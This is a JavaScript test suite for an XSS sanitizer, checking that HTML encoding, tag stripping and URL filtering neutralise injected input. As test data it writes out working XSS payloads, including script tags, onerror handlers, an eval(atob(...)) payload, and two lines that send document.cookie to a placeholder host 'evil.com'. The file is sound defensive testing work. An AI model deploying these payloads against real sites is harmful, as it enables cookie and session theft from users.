/**
 * XSS Protection Test Suite
 * Tests for sanitizer utility functions
 */

import sanitizer from "../src/utils/sanitizer.js";

// Mock test framework functions
const tests = [];
let testResults = { passed: 0, failed: 0, total: 0 };

function test(description, testFn) {
  tests.push({ description, testFn });
}

function expect(actual) {
  return {
    toBe(expected) {
      if (actual === expected) {
        console.log(`✅ PASS: Expected ${expected}, got ${actual}`);
        testResults.passed++;
      } else {
        console.log(`❌ FAIL: Expected ${expected}, got ${actual}`);
        testResults.failed++;
      }
      testResults.total++;
    },
    toContain(expected) {
      if (actual.includes(expected)) {
        console.log(`✅ PASS: "${actual}" contains "${expected}"`);
        testResults.passed++;
      } else {
        console.log(`❌ FAIL: "${actual}" does not contain "${expected}"`);
        testResults.failed++;
      }
      testResults.total++;
    },
    not: {
      toContain(expected) {
        if (!actual.includes(expected)) {
          console.log(`✅ PASS: "${actual}" does not contain "${expected}"`);
          testResults.passed++;
        } else {
          console.log(
            `❌ FAIL: "${actual}" contains "${expected}" (should not)`,
          );
          testResults.failed++;
        }
        testResults.total++;
      },
    },
  };
}

// Test Cases for HTML Encoding
test("HTML encode basic script tag", () => {
  const malicious = '<script>alert("XSS")</script>';
  const result = sanitizer.htmlEncode(malicious);
  expect(result).toBe(
    "&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;",
  );
});

test("HTML encode javascript protocol", () => {
  const malicious = 'javascript:alert("XSS")';
  const result = sanitizer.htmlEncode(malicious);
  expect(result).toBe("javascript:alert(&quot;XSS&quot;)");
});

test("HTML encode img tag with onerror", () => {
  const malicious = '<img src="x" onerror="alert(1)">';
  const result = sanitizer.htmlEncode(malicious);
  // After encoding, dangerous attributes are safely encoded
  expect(result).toContain("&lt;img");
  expect(result).toContain("&quot;alert(1)&quot;");
});

// Test Cases for HTML Sanitization
test("Sanitize HTML removes script tags", () => {
  const malicious = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
  const result = sanitizer.sanitizeHtml(malicious);
  expect(result).not.toContain("<script>");
  expect(result).toContain("<p>Hello</p>");
});

test("Sanitize HTML removes dangerous attributes", () => {
  const malicious = '<button onclick="alert(1)">Click me</button>';
  const result = sanitizer.sanitizeHtml(malicious);
  expect(result).not.toContain("onclick");
  // Note: button tag is removed as it's in dangerous tags list
  expect(result).not.toContain("<button>");
});

test("Sanitize HTML removes iframe tags", () => {
  const malicious = '<iframe src="javascript:alert(1)"></iframe>';
  const result = sanitizer.sanitizeHtml(malicious);
  expect(result).not.toContain("<iframe");
});

// Test Cases for Input Sanitization
test("Sanitize input with length limit", () => {
  const longInput = "a".repeat(2000);
  const result = sanitizer.sanitizeInput(longInput, { maxLength: 100 });
  expect(result.length).toBe(100);
});

test("Sanitize input preserves safe content", () => {
  const safeInput = "Hello World! This is safe text.";
  const result = sanitizer.sanitizeInput(safeInput);
  expect(result).toBe(safeInput);
});

test("Sanitize input encodes HTML by default", () => {
  const htmlInput = "<b>Bold text</b>";
  const result = sanitizer.sanitizeInput(htmlInput);
  expect(result).toBe("&lt;b&gt;Bold text&lt;&#x2F;b&gt;");
});

// Test Cases for Profile Sanitization
test("Sanitize profile data", () => {
  const profileData = {
    username: '<script>alert("xss")</script>user',
    email: "user@example.com",
    bio: "<p>Hello <script>alert(1)</script> world</p>",
  };

  const result = sanitizer.sanitizeProfile(profileData);
  expect(result.username).not.toContain("<script>");
  expect(result.email).toBe("user@example.com");
  expect(result.bio).not.toContain("<script>");
});

// Test Cases for URL Sanitization
test("Sanitize URL blocks javascript protocol", () => {
  const maliciousUrl = 'javascript:alert("XSS")';
  const result = sanitizer.sanitizeUrl(maliciousUrl);
  expect(result).toBe("");
});

test("Sanitize URL allows HTTPS", () => {
  const safeUrl = "https://example.com/path";
  const result = sanitizer.sanitizeUrl(safeUrl);
  expect(result).toBe("https:&#x2F;&#x2F;example.com&#x2F;path");
});

test("Sanitize URL blocks data protocol", () => {
  const maliciousUrl = "data:text/html,<script>alert(1)</script>";
  const result = sanitizer.sanitizeUrl(maliciousUrl);
  expect(result).toBe("");
});

// Test Cases for Reflected XSS
test("Reflected XSS in search parameter", () => {
  const searchQuery =
    '<script>document.location="http://evil.com/cookie="+document.cookie</script>';
  const result = sanitizer.sanitizeInput(searchQuery);
  expect(result).not.toContain("<script>");
  // After HTML encoding, dangerous content is safely encoded but still visible
  expect(result).toContain("document.cookie"); // This is now safe as it's HTML encoded
});

// Test Cases for Persistent XSS
test("Persistent XSS in comment field", () => {
  const comment =
    "Nice game! <img src=\"x\" onerror=\"fetch('http://evil.com/steal', {method:'POST', body:document.cookie})\">";
  const result = sanitizer.sanitizeInput(comment);
  // After HTML encoding, these are safe but still visible as encoded text
  expect(result).toContain("onerror"); // Safe because it's HTML encoded
  expect(result).toContain("fetch"); // Safe because it's HTML encoded
  expect(result).not.toContain("<img>"); // Should not contain unencoded tags
});

// Test Cases for DOM-based XSS
test("DOM XSS via innerHTML simulation", () => {
  const userInput =
    "<img src=x onerror=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">";
  const result = sanitizer.sanitizeInput(userInput);
  // After HTML encoding, these are safe but still visible as encoded text
  expect(result).toContain("onerror"); // Safe because it's HTML encoded
  expect(result).toContain("eval"); // Safe because it's HTML encoded
  expect(result).not.toContain("<img "); // Should not contain unencoded tags
});

// Test Cases for Advanced XSS Techniques
test("XSS with encoded characters", () => {
  const encoded = "&lt;script&gt;alert(1)&lt;/script&gt;";
  const decoded = sanitizer.htmlDecode(encoded);
  const sanitized = sanitizer.sanitizeInput(decoded);
  // After re-encoding, alert(1) is safely encoded
  expect(sanitized).toContain("alert(1)"); // Safe because it's HTML encoded
});

test("XSS with mixed case", () => {
  const mixedCase = '<ScRiPt>AlErT("XSS")</ScRiPt>';
  const result = sanitizer.sanitizeHtml(mixedCase);
  expect(result).not.toContain("ScRiPt");
  expect(result).not.toContain("AlErT");
});

// Run all tests
export function runXSSTests() {
  console.log("\n🧪 Running XSS Protection Tests...\n");

  tests.forEach(({ description, testFn }) => {
    console.log(`\n📋 Test: ${description}`);
    try {
      testFn();
    } catch (error) {
      console.log(`❌ ERROR: ${error.message}`);
      testResults.failed++;
      testResults.total++;
    }
  });

  console.log("\n📊 Test Results:");
  console.log(`✅ Passed: ${testResults.passed}`);
  console.log(`❌ Failed: ${testResults.failed}`);
  console.log(`📈 Total: ${testResults.total}`);
  console.log(
    `📊 Success Rate: ${Math.round((testResults.passed / testResults.total) * 100)}%`,
  );

  return testResults;
}

// Export for use in other test files
export default {
  runXSSTests,
  testResults,
};
